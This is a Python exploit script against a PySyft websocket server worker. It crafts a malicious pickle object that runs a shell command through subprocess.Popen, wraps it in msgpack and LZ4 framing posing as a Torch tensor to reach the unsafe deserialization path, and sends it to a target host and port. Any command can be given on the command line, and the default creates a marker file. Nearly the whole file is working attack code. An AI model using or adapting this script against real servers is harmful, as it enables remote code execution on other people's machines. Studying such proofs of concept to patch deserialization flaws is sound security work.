import argparse
import asyncio
import binascii
import lz4.frame
import msgpack
import pickle
import websockets


class MaliciousObject(object):
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        import os
        import subprocess
        if os.name == 'posix':
            return subprocess.Popen, (self.command, 0, None, None, None, None, None, None, True)
        elif os.name == 'nt':
            return None


def build_exploit(command):
    """
    Based on method _legacy_save from
    torch/serialization.py
    """
    # From syft/serde/compression.py
    LZ4 = 41

    rce_object = MaliciousObject(command)
    command_to_execute = pickle.dumps(rce_object, protocol=2)
    # Constants are required by pytorch to properly iterpret/deserialize the stream.
    # The first value: 14 means that the following object (the tuple) should be interpreted as
    # a Torch Tensor. I've realized this reviewing function "_detail" in:
    # syft/serde/msgpack/serde.py
    # In that function there is a dictionary "detailers".
    # We need this to reach the vulnerable code path where our malicious object
    # is passed to pickle
    payload = (14, (4474411590, command_to_execute, None, None, None, None, (5, (b'torch',))))
    packed_payload = msgpack.packb(payload)

    # Based on _compress method from syft/serde/compression.py
    compressed_payload = LZ4.to_bytes(1, byteorder="big") + lz4.frame.compress(packed_payload)
    return compressed_payload


async def send_payload(host, port):
    uri = "ws://%s:%d" % (host, port)
    async with websockets.connect(uri) as websocket:
        await websocket.send(str(binascii.hexlify(exp)))


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Target host running PySyft websocket server worker", type=str)
parser.add_argument("port", help="Target websocket server port", type=int)
parser.add_argument("--command", help="Command to execute in the target websocket server",
                    type=str, default="touch /tmp/federated_sophia")

args = parser.parse_args()

exp = build_exploit(args.command)
asyncio.get_event_loop().run_until_complete(send_payload(args.host, args.port))
